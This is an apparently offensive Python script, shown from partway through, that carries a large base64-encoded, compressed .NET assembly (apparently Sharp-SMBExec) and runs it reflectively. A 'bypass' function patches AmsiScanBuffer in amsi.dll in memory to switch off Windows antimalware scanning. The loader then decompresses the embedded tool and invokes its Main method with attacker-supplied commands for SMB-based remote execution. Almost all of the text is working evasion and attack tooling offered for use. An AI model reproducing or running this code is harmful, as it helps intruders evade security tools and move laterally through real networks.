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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Sharp-SMBExec.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()